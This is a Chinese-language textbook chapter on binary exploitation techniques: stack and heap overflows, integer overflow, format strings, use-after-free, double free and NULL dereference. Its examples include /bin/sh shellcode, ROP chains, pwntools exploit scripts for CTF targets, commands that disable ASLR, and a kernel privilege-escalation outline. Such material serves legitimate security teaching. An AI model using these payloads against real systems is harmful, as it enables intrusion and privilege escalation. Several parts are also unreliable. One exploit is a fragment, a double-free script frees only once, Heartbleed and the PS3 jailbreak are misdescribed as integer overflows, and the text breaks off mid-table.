## 7.1 栈溢出（Stack Buffer Overflow）

### 7.1.1 基本原理

栈溢出是最经典、最基础的二进制漏洞类型，其核心思想是：**通过向栈上的缓冲区写入超出其容量的数据，覆盖相邻的内存区域（如返回地址、保存的帧指针等），从而改变程序的执行流程**。

#### 栈的内存布局

在 x86 和 x86-64 架构中，栈是从高地址向低地址增长的。典型的栈帧结构如下：

```
+------------------+ 高地址
|    参数 n        |
|    ...          |
|    参数 1        |
+------------------+
|    返回地址      |  <- 被覆盖的目标
+------------------+
|    保存的 EBP    |  <- 保存的帧指针
+------------------+
|    局部变量      |
|    缓冲区        |  <- 溢出起始点
|    ...          |
+------------------+ 低地址
```

当程序调用函数时，会依次执行以下操作：

1. **参数入栈**：将函数参数从右向左依次压入栈中
2. **返回地址入栈**：`CALL` 指令将返回地址（`EIP`/`RIP`）压入栈中
3. **保存帧指针**：将当前帧指针 `EBP`/`RBP` 压入栈中，并更新帧指针指向新的栈帧
4. **分配局部变量空间**：通过 `sub esp, N` 或 `sub rsp, N` 分配局部变量空间

#### 经典漏洞代码示例

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];  // 栈上的缓冲区
    strcpy(buffer, input);  // 危险：没有长度检查
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

**漏洞分析**：

- `strcpy()` 函数不检查源字符串长度，会一直复制直到遇到 `\0` 结束符
- 如果 `input` 的长度超过 64 字节，多余的数据会覆盖 `buffer` 之后的栈内容
- 返回地址位于 `buffer` 上方，可以被精心构造的数据覆盖

### 7.1.2 经典 Exploit 技术

#### 基础栈溢出利用

最简单的利用方式是：**构造 Payload 使得返回地址指向攻击者注入的 Shellcode**。

```
+------------------+
|   Padding (64B)  |  <- 填充到 buffer 边界
+------------------+
| Saved EBP (4B)   |  <- 覆盖保存的帧指针
+------------------+
| Return Address   |  <- 覆盖为 Shellcode 地址
+------------------+
|    Shellcode     |  <- 恶意代码
+------------------+
```

#### Shellcode 示例（Linux x86）

```nasm
; execve("/bin/sh", NULL, NULL)
section .text
global _start

_start:
    xor eax, eax        ; eax = 0
    push eax            ; 字符串结束符
    push 0x68732f6e     ; "hs/n" (little-endian)
    push 0x69622f2f     ; "//ib" (little-endian)
    mov ebx, esp        ; ebx = "//bin/sh"
    xor ecx, ecx        ; ecx = NULL
    xor edx, edx        ; edx = NULL
    mov al, 0x0b        ; syscall number = 11 (execve)
    int 0x80            ; 触发系统调用
```

编译后的字节码：

```python
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

#### ROP（Return-Oriented Programming）

现代系统开启了 NX（No-Execute）保护，栈上的代码不可执行。ROP 技术通过串联现有代码片段（Gadget）来绕过 NX。

**基本原理**：

- 寻找以 `ret` 结尾的代码片段（Gadget）
- 在栈上构造 Gadget 地址序列，每个 Gadget 执行完成后跳转到下一个
- 实现任意代码执行

**示例 ROP 链**：

```python
# 目标：调用 system("/bin/sh")
rop_chain = [
    pop_rdi_ret,      # pop rdi; ret
    bin_sh_addr,      # "/bin/sh" 字符串地址
    system_addr,      # system() 的 PLT 地址
]
```

### 7.1.3 保护机制与绕过

#### ASLR（Address Space Layout Randomization）

ASLR 随机化程序的内存布局，使得每次运行时栈、堆、库的地址都不同。

**绕过技术**：

1. **信息泄露**：通过格式化字符串漏洞等泄露栈/堆地址
2. **爆破**：在 32 位系统上，ASLR 的熵值较低（约 16 位），可以尝试爆破
3. **部分覆盖**：只覆盖地址的低位字节（可能需要多次尝试）

检查系统 ASLR 状态：

```bash
# Linux
cat /proc/sys/kernel/randomize_va_space
# 0 = 关闭
# 1 = 部分随机化
# 2 = 完全随机化

# 临时关闭（需要 root）
echo 0 > /proc/sys/kernel/randomize_va_space
```

#### Stack Canaries（栈保护）

编译器在栈帧中插入随机值（Canary），函数返回前检查该值是否被修改。

**绕过技术**：

1. **信息泄露**：泄露 Canary 值
2. **线程局部存储**：某些实现使用 TLS 存储 Canary，可能被覆盖
3. **格式化字符串漏洞**：读取栈上的 Canary

编译时开启/关闭 Canary：

```bash
# 开启
gcc -fstack-protector-all -o vuln vuln.c

# 关闭
gcc -fno-stack-protector -o vuln vuln.c
```

#### NX（No-Execute / DEP）

标记栈和堆为不可执行，防止直接执行注入的 Shellcode。

**绕过技术**：

1. **ROP/JOP**：利用现有代码片段
2. **ret2libc**：跳转到 libc 中的函数（如 `system()`）
3. **mprotect()**：通过系统调用修改内存权限

### 7.1.4 CTF 实战案例：Pwnable.kr bof

**题目描述**：简单的栈溢出题目，需要覆盖返回地址跳转到目标函数。

**分析**：

```bash
# 下载题目
wget http://pwnable.kr/bin/bof

# 检查保护
checksec bof
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found

# PIE:      PIE enabled
```

反汇编发现：

- 存在函数 `func()` 和 `overflowme()`
- 目标函数 `callMeMaybe()` 包含 flag

**Exploit**：

```python

payload += p32(0xdeadbeef)  # 覆盖返回地址

p.sendline(payload)
p.interactive()
```

## 7.2 堆溢出（Heap Overflow）

### 7.2.1 堆管理器基础

现代 Linux 系统使用 **ptmalloc2**（glibc 的默认堆管理器）来管理堆内存。理解堆溢出需要掌握其核心数据结构。

#### 堆块结构（malloc_chunk）

每个分配的内存块都有一个头部结构：

```c
struct malloc_chunk {
    INTERNAL_SIZE_T mchunk_prev_size;  /* 前一个块大小（仅当空闲时有效） */
    INTERNAL_SIZE_T mchunk_size;        /* 当前块大小 + 标志位 */
    struct malloc_chunk* fd;            /* 前向指针（仅空闲块） */
    struct malloc_chunk* bk;            /* 后向指针（仅空闲块） */
    /* 空闲大块还有: */
    struct malloc_chunk* fd_nextsize;   /* 大块链表前向指针 */
    struct malloc_chunk* bk_nextsize;   /* 大块链表后向指针 */
};
```

**关键标志位**：

- `PREV_INUSE (0x1)`：前一个块是否在使用
- `IS_MMAPPED (0x2)`：是否通过 mmap 分配
- `NON_MAIN_ARENA (0x4)`：是否属于非主分配区

**内存布局**：

```
+------------------+
|  prev_size (8B)  |  <- 仅当 PREV_INUSE = 0 时有效
+------------------+
|  size (8B)       |  <- 包含标志位
+------------------+
|  user data       |  <- 用户数据起始点
|  ...             |
+------------------+
|  next chunk      |
+------------------+
```

#### 堆管理结构

**Bins（容器）**：

- **Fast Bins**：单链表，管理小块（< 0x80 字节），LIFO 顺序
- **Small Bins**：双链表，管理中等块
- **Large Bins**：双链表，管理大块，按大小排序
- **Unsorted Bin**：临时容器，刚释放的块先放入这里
- **Tcache**（glibc 2.26+）：线程本地缓存，每个线程独立的 Fast Bin 类结构

**Arena（分配区）**：

```c
struct malloc_state {
    int flags;                        /* 状态标志 */
    void *fastbinsY[NFASTBINS];      /* Fast bins 数组 */
    mchunkptr top;                    /* Top chunk */
    mchunkptr bins[NBINS * 2 - 2];    /* Bins 数组 */
    unsigned int binmap[BINMAPSIZE];  /* Bin 位图 */
    struct malloc_state *next;        /* 下一个 arena */
    /* ... */
};
```

### 7.2.2 经典堆利用技术

#### Unlink 攻击（旧版 glibc）

**原理**：利用双向链表卸载操作，实现任意地址写入。

当一个空闲块从链表中移除时，执行以下操作：

```c
// 经典 unlink 宏（已修复）
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;    // 写入操作
    BK->fd = FD;    // 写入操作
}
```

**攻击步骤**：

1. 构造假 chunk，设置 `fd` 和 `bk` 指针
2. 触发 unlink 操作
3. 实现 `FD->bk = BK`，即 `[FD + 12] = BK`

**修复后的检查**：

```c
if (chunk->fd->bk != chunk || chunk->bk->fd != chunk)
    abort();  // 检测到攻击
```

#### Fastbin Attack

**原理**：利用 Fast Bin 的单链表结构，伪造 Fast Bin 链表。

**条件**：

- 能够泄露堆地址
- 能够写入假 chunk 到 Fast Bin
- 目标地址附近的值可以伪造为合法 size

**经典利用场景**：覆盖 `__malloc_hook`

```python
# 伪造 Fast Bin chunk
fake_chunk = target_addr - 0x23  # 调整使 size 合法
payload = p64(fake_chunk)       # 写入 Fast Bin
```

**CTF 示例**：

```python
from pwn import *

# 分配多个 Fast Bin 大小的块
add(0x60, 'A' * 0x60)  # chunk 0
add(0x60, 'B' * 0x60)  # chunk 1

# 释放 chunk 0，进入 Fast Bin
free(0)

# 溢出修改 chunk 0 的 fd 指针
payload = b'A' * 0x60 + p64(0x71) + p64(target_addr)
edit(0, payload)

# 再次分配，Fast Bin 链表被污染
add(0x60, 'C' * 0x60)  # 从 Fast Bin 分配
add(0x60, p64(one_gadget))  # 从目标地址分配，覆盖 hook
```

#### Tcache Poisoning（glibc 2.26+）

**原理**：Tcache 比 Fast Bin 更简单，几乎没有安全检查。

**特点**：

- 每个 Thread 独立
- 每个 size class 有独立的链表（最多 64 个）
- 没有大小检查，只有简单的 double free 检查（2.29+）

**利用步骤**：

```python
# 1. 分配两个相同大小的块
add(0x20, 'A' * 0x20)  # chunk A
add(0x20, 'B' * 0x20)  # chunk B

# 2. 释放 A，进入 Tcache
free(A)

# 3. 溢出修改 A 的 next 指针（tcache_entry->next）
# 或者利用 UAF 直接修改
edit(A, p64(target_addr))

# 4. 分配两次，第二次返回目标地址
add(0x20, 'C' * 0x20)  # 返回原地址
add(0x20, p64(one_gadget))  # 返回目标地址
```

#### House of 系列技术

**House of Force**：

- 通过覆盖 Top Chunk 的 size 为极大值
- 利用 malloc 负数偏移分配到任意地址

**House of Spirit**：

- 释放一个伪造的 chunk
- 后续 malloc 返回伪造地址

**House of Orange**：

- 利用 Top Chunk 的 `brk` 扩展机制
- 触发 `_IO_flush_all_lockp` 执行 IO 函数指针

### 7.2.3 CTF 实战案例：how2heap

**题目环境**：glibc 2.27，演示 Tcache Stashing Unlink Attack

**关键代码分析**：

```c
// 分配多个 Small Bin 大小的块
for (int i = 0; i < 7; i++) {
    malloc(0x90);  // 填满 Tcache
}
for (int i = 0; i < 7; i++) {
    free(ptr[i]);  // 释放到 Tcache
}

// 分配但不填充，使得后续释放进入 Small Bin
void *a = malloc(0x90);
void *b = malloc(0x90);
free(a);  // 进入 Small Bin

// 触发 malloc_consolidate，Small Bin 移动到 Tcache
malloc(0x400);  // 触发 stashing unlink
```

**利用效果**：

- 控制 Tcache 链表
- 实现 Tcache Poisoning

## 7.3 整数溢出（Integer Overflow）

### 7.3.1 基本概念

整数溢出是指：**当算术运算的结果超出了整数类型的表示范围时，发生截断导致结果不正确**。

#### CWE 分类

- **CWE-190**：整数溢出或回绕（Integer Overflow or Wraparound）
- **CWE-191**：整数下溢（Integer Underflow）
- **CWE-681**：不正确的数值类型转换

#### 整数范围

| 类型 | 有符号范围 | 无符号范围 |
|------|-----------|-----------|
| `int8_t` | -128 ~ 127 | 0 ~ 255 |
| `int16_t` | -32,768 ~ 32,767 | 0 ~ 65,535 |
| `int32_t` | -2,147,483,648 ~ 2,147,483,647 | 0 ~ 4,294,967,295 |
| `int64_t` | -2⁶³ ~ 2⁶³-1 | 0 ~ 2⁶⁴-1 |

### 7.3.2 漏洞模式

#### 溢出导致缓冲区分配不足

```c
// 危险：没有检查溢出
void* allocate_buffer(size_t count, size_t size) {
    size_t total = count * size;  // 可能溢出！
    return malloc(total);
}

// 安全版本
void* allocate_buffer_safe(size_t count, size_t size) {
    if (count > SIZE_MAX / size) {
        return NULL;  // 检测到溢出
    }
    return malloc(count * size);
}
```

#### 溢出导致安全检查绕过

```c
// CVE-2011-0419 模式
int copy_data(char *src, int len) {
    char buf[256];
    
    if (len > 256) {  // 检查 len
        return -1;
    }
    
    // len 作为有符号整数，如果为负数，通过检查
    // 但作为 size_t 传递给 memcpy，变成大正数
    memcpy(buf, src, len);  // len 转换为 size_t
    return 0;
}

// 攻击：传入 len = -1
// 检查通过（-1 < 256）
// memcpy 复制 SIZE_MAX 字节
```

#### 下溢（Underflow）

```c
void process_array(int *arr, int index) {
    int value;
    
    if (index > 0) {  // 检查 index > 0
        value = arr[index - 1];  // 但 index = 0 时，index - 1 下溢
    }
    
    // 如果 index 为无符号数且为 0
    // index - 1 = UINT_MAX
    // arr[UINT_MAX] 越界访问
}
```

### 7.3.3 真实案例

#### Apple SSL "goto fail"（CVE-2014-1266）

**背景**：iOS 和 OS X 的 SSL/TLS 实现中存在严重漏洞，允许中间人攻击。

**漏洞代码**：

```c
static OSStatus
SSLVerifySignedServerKeyExchange(SSLContext *ctx, bool isRsa, SSLBuffer signedParams,
                                 uint8_t *signature, UInt16 signatureLen)
{
    OSStatus err;
    
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
        goto fail;
    goto fail;  // 重复的 goto fail！
    
    if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
        goto fail;
    
    // ... 验证签名代码 ...
    
fail:
    SSLFreeBuffer(&signedParams);
    return err;
}
```

**问题**：

- 重复的 `goto fail` 导致跳过了签名验证
- 这是代码重复，而非整数溢出，但展示了相似的逻辑错误

**正确的整数溢出示例**：OpenSSL Heartbleed（CVE-2014-0160）

```c
// 心跳请求处理
int process_heartbeat(unsigned char *request, int len) {
    // 从请求中读取长度（2字节，无符号）
    uint16_t payload_len = *(uint16_t*)(request + 3);
    
    // 分配响应缓冲区
    unsigned char *response = malloc(3 + payload_len + 16);
    
    // 复制 payload
    memcpy(response + 3, request + 5, payload_len);  // 问题：没有验证 payload_len <= len - 5
    
    // payload_len 来自用户输入，可能大于实际请求长度
    // 导致读取越界内存（泄露敏感信息）
}
```

#### PS3 Jailbreak（2010）

**背景**：索尼 PS3 的签名验证存在整数溢出漏洞，被用于越狱。

**漏洞原理**：

```c
// 简化的签名验证逻辑
int verify_signature(uint8_t *pkg, size_t pkg_len) {
    uint32_t data_len = *(uint32_t*)(pkg + 0x40);  // 从包中读取长度
    uint32_t sig_offset = data_len + 0x80;         // 计算签名偏移
    
    if (sig_offset + 0x100 > pkg_len) {            // 边界检查
        return -1;
    }
    
    uint8_t *signature = pkg + sig_offset;
    // ... RSA 验证 ...
}
```

**问题**：

- `data_len` 来自用户输入的包文件
- 当 `data_len = 0xFFFFFFFF` 时，`sig_offset = 0xFFFFFFFF + 0x80 = 0x7F`（溢出）
- 边界检查通过（`0x7F + 0x100 < pkg_len`）
- 但签名指针指向错误位置，导致绕过验证

### 7.3.4 CTF 实战案例：整数溢出绕过长度检查

**题目代码**：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

int main() {
    char buffer[64];
    int len;
    
    printf("Enter length: ");
    scanf("%d", &len);  // 有符号整数
    
    if (len > 64) {
        printf("Too long!\n");
        return 1;
    }
    
    printf("Enter data: ");
    read(0, buffer, len);  // read 的第三个参数是 size_t（无符号）
    
    return 0;
}
```

**利用**：

```python
from pwn import *

p = process('./vuln')

# 输入负数
# 检查通过（-1 < 64）
# 但 read(-1) 中 -1 转换为 size_t 为 0xFFFFFFFF（最大值）
p.sendlineafter(b'length: ', b'-1')
p.sendline(b'A' * 100)  # 触发溢出
```

## 7.4 格式化字符串漏洞（Format String Vulnerability）

### 7.4.1 基本原理

格式化字符串漏洞源于 `printf` 等格式化输出函数的误用：

```c
// 危险：用户输入直接作为格式化字符串
printf(user_input);

// 安全：用户输入作为参数
printf("%s", user_input);
```

#### 格式化函数家族

```c
printf(const char *format, ...);
fprintf(FILE *stream, const char *format, ...);
sprintf(char *str, const char *format, ...);
snprintf(char *str, size_t size, const char *format, ...);
vprintf(const char *format, va_list ap);
```

#### 格式化说明符

| 说明符 | 功能 | 安全风险 |
|--------|------|---------|
| `%d` | 输出整数 | 泄露栈数据 |
| `%s` | 输出字符串 | 泄露任意地址内容 |
| `%x` | 输出十六进制 | 泄露栈数据 |
| `%n` | **写入整数** | **写入任意地址** |
| `%p` | 输出指针 | 泄露栈数据 |
| `%c` | 输出字符 | 可配合 %n |

### 7.4.2 漏洞利用技术

#### 泄露栈数据

```
输入: %x.%x.%x.%x.%x.%x.%x.%x
输出: 0.f7ffc5c0.8048486.f7ffd000.0.f7ffd9a8.8048486.f7e2dae4
```

每次 `%x` 读取栈上的一个 4 字节值（32 位系统）或 8 字节值（64 位系统）。

#### 泄露任意地址

使用 `%s` 可以读取指定地址的字符串：

```
输入: AAAA%08x.%08x.%08x.%08x|%s|
```

当格式化字符串位于栈上时，可以通过调整偏移使 `%s` 读取 AAAA 作为指针。

#### 写入任意地址：%n

`%n` 将已输出的字符数写入参数指向的地址：

```c
int count;
printf("Hello%nWorld\n", &count);
// count = 5（"Hello" 的长度）
```

**利用示例**：

```
目标：修改 GOT 表项 printf@got 为 system

步骤：
1. 泄露栈地址，计算格式化字符串偏移
2. 构造 payload：AAAA%n + 地址
3. 使用多个 %n 写入目标值
```

#### 精确写入：pwntools 辅助

```python
from pwn import *

# 目标地址和值
target = 0x804a000  # GOT 地址
value = 0x08048460  # system 地址

# 计算格式化字符串偏移
offset = 6  # 通过调试确定

# 构造 payload（32 位）
payload = fmtstr_payload(offset, {target: value})

# 发送
p.sendline(payload)
```

### 7.4.3 高级技术

#### 泄露 GOT 地址

```python

payload = p32(printf_got) + b'%6$s'
p.sendline(payload)

# 接收并解析

printf_addr = u32(response[4:8])
```

#### 修改返回地址

```python
# 1. 泄露栈上的返回地址
p.sendline(b'%7$p')
saved_eip = int(p.recvline(), 16)

# 2. 计算目标地址（返回地址位置）
ret_addr = saved_eip - offset

# 3. 修改返回地址
payload = fmtstr_payload(offset, {ret_addr: win_addr})
p.sendline(payload)
```

## 7.5 释放后使用（Use-After-Free, UAF）

### 7.5.1 基本概念

UAF（Use-After-Free）是指：**程序在释放内存后继续使用指向该内存的指针，导致未定义行为**。

**危险后果**：

1. **信息泄露**：读取被重新分配的内存内容
2. **代码执行**：覆盖被释放内存中的函数指针
3. **任意写入**：修改被释放内存中的数据指针

#### 经典漏洞模式

```c
#include <stdlib.h>

typedef struct {
    void (*func)(void);
    char data[32];
} Object;

int main() {
    Object *obj = malloc(sizeof(Object));
    obj->func = safe_function;
    
    free(obj);  // 释放内存
    
    // 漏洞：悬空指针仍被使用
    obj->func();  // Use-After-Free！
    
    return 0;
}
```

### 7.5.2 利用技术

#### 基础利用流程

```
1. 分配对象 A（包含函数指针）
2. 释放对象 A（指针仍保留）
3. 分配对象 B（大小相同，复用内存）
4. 通过对象 A 的悬空指针修改函数指针
5. 触发函数调用，劫持控制流
```

#### C++ 虚表劫持

C++ 对象的虚表指针（vptr）是常见的 UAF 攻击目标：

```cpp
class Base {
public:
    virtual void process() { /* 安全操作 */ }
};

class Derived : public Base {
public:
    virtual void process() { /* 重写方法 */ }
};

void vulnerable() {
    Base *obj = new Derived();
    delete obj;  // 释放内存
    
    // ... 中间可能分配新对象复用内存 ...
    
    obj->process();  // UAF：调用虚函数
}
```

**攻击方法**：

1. 在被释放的内存位置分配可控数据
2. 伪造虚表指针指向攻击者控制的内存
3. 触发虚函数调用时执行 shellcode 或 ROP

### 7.5.3 CTF 经典案例：HITCON 2014 stkof

**题目分析**：

这是一个经典的堆利用题目，包含：

- 添加、删除、编辑对象的操作
- UAF 漏洞（删除后未清零指针）
- 无 PIE，Partial RELRO

**关键代码逻辑**：

```c
// 简化的题目逻辑
struct Item {
    size_t size;
    char *data;
} items[100];

void add(size_t size) {
    items[idx].size = size;
    items[idx].data = malloc(size);
}

void remove(int idx) {
    free(items[idx].data);
    // 漏洞：没有清零 items[idx].data
}

void edit(int idx, char *input) {
    // 漏洞：可以编辑已释放的块
    read(0, items[idx].data, items[idx].size);
}
```

**Exploit 策略**：

```python
from pwn import *

# 1. 分配多个块，构造 unlink 场景
add(0x80)  # chunk 0
add(0x80)  # chunk 1
add(0x80)  # chunk 2

# 2. 释放 chunk 1，进入 unsorted bin
remove(1)

# 3. 编辑 chunk 1（UAF），构造假 chunk
# 利用 unlink 写入目标地址
fake_chunk = p64(0) + p64(0x81)  # prev_size, size
fake_chunk += p64(target - 0x18) + p64(target - 0x10)  # fd, bk
edit(1, fake_chunk)

# 4. 触发 unlink
remove(2)  # 合并时触发 unlink

# 5. 现在可以任意地址写入
edit(1, p64(system_addr))
```

### 7.5.4 CVE-2015-5119：Flash UAF

**背景**：Adobe Flash Player 的 UAF 漏洞，被广泛用于攻击。

**漏洞原理**：

ActionScript 中的 ByteArray 对象在释放后可被重新引用：

```actionscript

ba.writeMultiByte("data", "utf-8");

// 释放 ByteArray

ba = null;
System.gc();  // 触发垃圾回收

// 悬空引用（简化表示）
// 攻击者可以通过其他对象引用被释放的内存
// 并覆盖其中的函数指针
```

**利用步骤**：

1. 创建 ByteArray 对象
2. 触发 GC，释放对象
3. 分配新对象复用内存
4. 通过悬空指针修改 ByteArray 的内部结构
5. 调用 ByteArray 方法时执行任意代码

## 7.6 双重释放（Double Free）

### 7.6.1 基本概念

Double Free 是指：**对同一块内存进行两次释放，导致堆管理器状态混乱**。

**危险后果**：

1. **堆结构破坏**：影响 malloc_state 的链表完整性
2. **任意地址写入**：利用循环链表写入目标地址
3. **代码执行**：覆盖函数指针（如 `__malloc_hook`）

#### 经典漏洞代码

```c
#include <stdlib.h>

int main() {
    void *p = malloc(0x60);
    
    free(p);    // 第一次释放
    free(p);    // 第二次释放：Double Free！
    
    return 0;
}
```

### 7.6.2 堆管理器状态分析

#### Fast Bin Double Free

在 glibc 2.26 之前，Fast Bin 没有 Double Free 检测：

```
初始状态：
Fast Bin [0x70]: NULL

第一次 free(p)：
Fast Bin [0x70]: p -> NULL

第二次 free(p)（Double Free）：
Fast Bin [0x70]: p -> p -> NULL（循环链表）

后续 malloc：
第一次 malloc：返回 p
第二次 malloc：返回 p（同一个地址！）

此时可以写入 p 的 fd 指针：
Fast Bin [0x70]: p -> target_addr -> ???
```

#### Tcache Double Free（glibc 2.26-2.28）

Tcache 没有任何 Double Free 检测：

```python
# 经典 Tcache Double Free 利用
add(0x60, 'A' * 0x60)  # chunk 0
free(0)                # Tcache: 0 -> NULL
free(0)                # Tcache: 0 -> 0 -> NULL（循环）

# 分配两次得到同一地址
add(0x60, p64(target))  # 写入目标地址到 next 指针
add(0x60, 'B' * 0x60)   # 正常分配
add(0x60, 'C' * 0x60)   # 从 target_addr 分配
```

#### glibc 2.29+ 的保护

```c
// tcache_get 中的检查
if (tc_idx < mp_.tcache_bins && tcache->counts[tc_idx] > 0) {
    tcache_entry *e = tcache->entries[tc_idx];
    // 检测 Double Free
    if (e->key == (uintptr_t)target) {
        malloc_printerr("free(): double free detected in tcache");
    }
    // ...
}
```

### 7.6.3 利用技术：Fastbin Dup

**完整利用流程**：

```python
from pwn import *

p = process('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 1. 分配三个块
add(0x60, 'A' * 0x60)  # chunk A
add(0x60, 'B' * 0x60)  # chunk B（防止合并到 top）
add(0x60, 'C' * 0x60)  # chunk C（后续使用）

# 2. Double Free
free(A)    # Fast Bin: A -> NULL
free(B)    # Fast Bin: B -> A -> NULL
free(A)    # Fast Bin: A -> B -> A（循环）

# 3. 分配并写入目标地址
# 需要绕过 size 检查（找到一个合法的 fake size）
# __malloc_hook - 0x23 处有合法的 0x7f
target = libc.symbols['__malloc_hook'] - 0x23
add(0x60, p64(target))  # A 的 fd 指向 target

# 4. 分配两次
add(0x60, 'D' * 0x60)   # 返回 A
add(0x60, 'E' * 0x60)   # 返回 B
add(0x60, b'F' * 0x13 + p64(one_gadget))  # 返回 target，覆盖 hook

# 5. 触发 malloc 调用
free(B)  # 触发 __malloc_hook
p.interactive()
```

### 7.6.4 CTF 实战案例：Double Free

**题目**：使用 glibc 2.27 的堆题目

**Exploit**：

```python
from pwn import *

context.arch = 'amd64'
p = remote('target', 9999)

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

add(0x50, b'A' * 0x50)  # 0
add(0x50, b'B' * 0x50)  # 1（防护）

free(0)   # Tcache: 0 -> 0 -> NULL（Double Free）

# 写入目标地址
target = 0x602030  # 假设的目标地址
add(0x50, p64(target))
add(0x50, b'X' * 0x50)
add(0x50, b'/bin/sh\x00')  # 从 target 分配

p.interactive()
```

## 7.7 空指针解引用（NULL Pointer Dereference）

### 7.7.1 基本概念

空指针解引用是指：**程序尝试访问或操作空指针（NULL，地址 0）指向的内存**。

**正常情况**：在现代操作系统中，地址 0 是不可访问的，解引用会触发段错误（SIGSEGV）。

**漏洞利用场景**：如果攻击者能够在地址 0 处映射可访问的内存页，就可以控制解引用的行为。

#### 漏洞代码示例

```c
struct Device {
    int (*read)(void);
    int (*write)(void);
};

struct Device *dev = NULL;  // 全局指针

int process_device() {
    // 漏洞：dev 可能为 NULL
    return dev->read();  // 解引用 NULL + 偏移
}
```

当 `dev` 为 NULL 时：

- `dev->read` 访问地址 `NULL + offsetof(struct Device, read)`
- 如果地址 0 可映射，攻击者可以控制读取的值

### 7.7.2 mmap NULL Page 攻击

#### Linux 内核历史

在旧版 Linux 内核（< 2.6.23）中，普通用户可以映射地址 0：

```c
// 成功映射 NULL 页
void *ptr = mmap(0, 0x1000, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
// ptr == NULL
```

**现代保护**：

```bash
# 检查 mmap_min_addr
cat /proc/sys/vm/mmap_min_addr
# 典型值：65536（64KB），防止映射低地址

# 临时修改（需要 root）
echo 0 > /proc/sys/vm/mmap_min_addr
```

#### 攻击步骤

```c
// 1. 映射 NULL 页
mmap(0, 0x1000, PROT_READ | PROT_WRITE,
     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

// 2. 在相应偏移写入目标值
*(unsigned long*)(NULL + offsetof(struct Device, read)) = shellcode_addr;

// 3. 触发空指针解引用
process_device();  // 执行 shellcode
```

### 7.7.3 CVE-2009-2692：Linux Kernel NULL Pointer

**背景**：Linux 内核中存在多个空指针解引用漏洞，可被用于本地提权。

**漏洞位置**：网络协议处理代码

```c
// 简化的漏洞代码
static int sock_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct socket *sock = file->private_data;
    
    // 某些路径下 sock 可能为 NULL
    // 但缺少 NULL 检查
    
    return sock->ops->ioctl(sock, cmd, arg);  // NULL deref
}
```

**利用步骤**：

1. 配置系统允许映射低地址（或有漏洞的内核版本）
2. 映射 NULL 页并设置函数指针
3. 触发特定的 ioctl 路径，导致空指针解引用
4. 内核执行攻击者控制的代码，提权到 root

**PoC 概要**：

```c
// 映射内核态可访问的内存（通过特定机制）
// 构造假的操作结构体
struct sock_ops fake_ops = {
    .ioctl = privilege_escalation,
};

// 在地址 0 放置假结构体指针
*(unsigned long*)0 = &fake_ops;

// 触发漏洞
int fd = socket(AF_INET, SOCK_STREAM, 0);
ioctl(fd, VULNERABLE_CMD, 0);  // 触发 NULL deref
```

### 7.7.4 现代 mitigations

#### mmap_min_addr

```bash
# 查看当前设置
sysctl vm.mmap_min_addr

# 建议值（安全）
vm.mmap_min_addr = 65536
```

#### SMEP/SMAP（x86）

- **SMEP（Supervisor Mode Execution Prevention）**：内核态不能执行用户态代码
- **SMAP（Supervisor Mode Access Prevention）**：内核态不能访问用户态数据（除非特殊指令）

这限制了内核空指针漏洞的利用，攻击者需要在内核空间寻找目标。

## 7.8 综合实战案例

### 7.8.1 多漏洞组合利用

在真实世界中，漏洞利用往往需要组合多种技术。

**示例场景**：

1. **信息泄露**：通过格式化字符串泄露栈地址和 libc 地址
2. **堆布局控制**：分配和释放块，控制堆结构
3. **UAF 利用**：通过悬空指针修改堆结构
4. **代码执行**：覆盖 `__free_hook` 或虚表指针

```python
from pwn import *

# 初始化
p = process('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 阶段 1：泄露地址
p.sendline(b'%7$p.%15$p')
stack_addr = int(p.recvuntil(b'.')[:-1], 16)
libc_base = int(p.recvline(), 16) - libc.symbols['puts'] - 0x1e6
log.info(f'Stack: {hex(stack_addr)}')
log.info(f'Libc: {hex(libc_base)}')

# 阶段 2：堆布局
for i in range(7):
    add(0x60, b'PAD' + p8(i))

# 阶段 3：UAF 利用
add(0x60, b'TARGET')  # 目标对象
free(0)               # 释放
add(0x60, b'FAKE')    # 复用内存

# 阶段 4：劫持控制流
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

edit(0, p64(free_hook))
add(0x60, p64(system))

# 触发
free(1)  # free(chunk) -> system(chunk)

p.interactive()
```

### 7.8.2 防护措施总结

| 保护机制 | 针对漏洞 | 绕过技术 |
